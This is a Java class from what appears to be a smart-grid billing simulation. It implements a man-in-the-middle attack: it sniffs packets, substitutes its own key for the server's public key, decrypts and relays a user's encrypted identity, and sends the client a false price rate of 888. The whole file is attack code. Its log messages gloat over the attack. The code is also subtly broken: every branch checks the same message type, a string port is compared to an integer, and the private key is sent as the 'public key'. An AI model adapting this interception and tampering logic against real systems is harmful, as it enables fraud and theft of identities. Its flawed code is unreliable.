package SmartGridBillingSenario.attack;

import SmartGridBillingSenario.message.Message;
import SmartGridBillingSenario.message.MessageType;
import SmartGridBillingSenario.message.QuoteAndRateResponseMessage;
import SmartGridBillingSenario.socket.SocketClient;
import SmartGridBillingSenario.utils.Utils;
import com.fasterxml.jackson.core.JsonProcessingException;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.codec.binary.Base64;
import org.pcap4j.packet.Packet;

import java.security.KeyPair;
import java.util.Map;

import static SmartGridBillingSenario.utils.Utils.buildKeyPair;
import static SmartGridBillingSenario.utils.Utils.getTcpValue;

/**
 * Created by yuandai on 28/9/17.
 */
@Slf4j
public class ManInTheMiddle extends Pcap4j {


    private String host;
    private int trePort;
    private int ppPort;

    private MiddleManClient middleManClientToPp;
    private MiddleManClient middleManClientToTre;

    private String publicKeyFromTre;

    private KeyPair keyPair;

    private static final int wrongValueToPp = 888;

    public ManInTheMiddle(String host, int serverPort) {
        super(host);
        this.host = host;
        this.trePort = serverPort;

        //create own KeyPair...
        keyPair = buildKeyPair();
        super.startCapture();
    }

    private class MiddleManClient extends SocketClient {

        public MiddleManClient(String host, int port) {
            super(host, port);
        }
    }

    @Override
    public void handleTcpData(String srcAddr, String dstAddr, String srcPort, String dstPort, Packet payload) {
        // from TRE to PP
        if (srcPort.equals(trePort)) {
            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);

                    //get Public Key from TRE, replace with own publicc key
                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_GET_PRICE)) {
                        publicKeyFromTre = String.valueOf(message.getObject());
                        log.info("HAHA!! Get PublicKey from TRE {}, can start Replace Attack", publicKeyFromTre);
                        ppPort = Integer.valueOf(dstPort);
                        sendOwnPublicKeyToPp();
                    }

                    // Get response from TRE, replace it with wrong value and send to PP
                    else if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_GET_PRICE)) {
                        Map<String, Object> result = (Map<String, Object>) message.getObject();
                        QuoteAndRateResponseMessage quoteAndRateResponseMessage = new QuoteAndRateResponseMessage(String.valueOf(result.get("quote")), Integer.valueOf(String.valueOf(result.get("rateValue"))));
                        String receivedQuote = quoteAndRateResponseMessage.getQuote();

                        log.info("HAHA!! Get received Quote and value from TRE {}, replace with wrong value 888, make you in trouble!!!");
                        ppPort = Integer.valueOf(dstPort);
                        sendWrongValueToPp(receivedQuote);
                    }
                } catch (Exception e) {
                    return;
                }
            }
            //from PP to TRE
        } else {
            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);

                    //get encrypte value from PP use it own private key to resolve it
                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_GET_PRICE)) {
                        String user = decryptKey(String.valueOf(message.getObject()));
                        log.info("HAHA!! Get USER from PP {}, can send this user to TRE to get response", user);
                        sendEncryptedUserToTre(user);
                    }
                } catch (Exception e) {
                    return;
                }
            }
        }


    }

    private String decryptKey(String value) {
        return Utils.decrypt(value, keyPair.getPrivate().getEncoded());
    }

    private void sendWrongValueToPp(String receivedQuote) {
        if (middleManClientToPp == null) {
            middleManClientToPp = new MiddleManClient(host, ppPort);
        }

        Message message = new Message(MessageType.RESPONSE_FROM_TRE_GET_PRICE, new QuoteAndRateResponseMessage(receivedQuote, wrongValueToPp));
        try {
            middleManClientToPp.sendToPort(Utils.messageToString(message));
        } catch (JsonProcessingException e) {
            log.error("Cannot send Message!! {}", e);
        }
    }

    private void sendOwnPublicKeyToPp() {
        if (middleManClientToPp == null) {
            middleManClientToPp = new MiddleManClient(host, ppPort);
        }


        String publicKey = Base64.encodeBase64String(keyPair.getPrivate().getEncoded());
        Message message = new Message(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST, publicKey);
        try {
            middleManClientToPp.sendToPort(Utils.messageToString(message));
        } catch (JsonProcessingException e) {
            log.error("Cannot send Message!! {}", e);
        }
    }


    private void sendEncryptedUserToTre(String user) {

        if (middleManClientToTre == null) {
            middleManClientToTre = new MiddleManClient(host, trePort);
        }

        String encryptedValue = Utils.encrypt(user, Base64.decodeBase64(publicKeyFromTre));
        Message message = new Message(MessageType.GET_PRICE, encryptedValue);
        try {
            middleManClientToTre.sendToPort(Utils.messageToString(message));
        } catch (JsonProcessingException e) {
            log.error("Cannot send Message!! {}", e);
        }
    }

}

